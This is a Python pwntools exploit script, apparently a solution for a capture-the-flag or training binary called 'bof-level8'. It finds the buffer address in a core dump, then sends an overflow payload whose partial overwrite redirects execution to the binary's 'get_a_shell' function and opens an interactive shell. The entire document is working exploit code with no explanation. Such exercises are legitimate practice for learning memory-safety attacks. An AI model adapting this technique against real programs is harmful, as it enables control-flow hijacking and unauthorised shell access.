#!/usr/bin/env python

import sys

from pwn import *

context.terminal = "/bin/bash"

buf = 'C' * 0x50 + '\x50'
c = Core('./core')

buffer_addr = c.stack.find(buf)

print(buffer_addr)
e = ELF('./bof-level8')

addr_of_get_a_shell = e.symbols['get_a_shell']


buf = 'A' * 8 + p64(addr_of_get_a_shell)

buf += 'C' * (0x80 - len(buf)) + '\x20'

p = process('./bof-level8')

if (len(sys.argv) > 1 and sys.argv[1] == "g"):
    gdb.attach(p)

p.sendline(buf)

p.interactive()

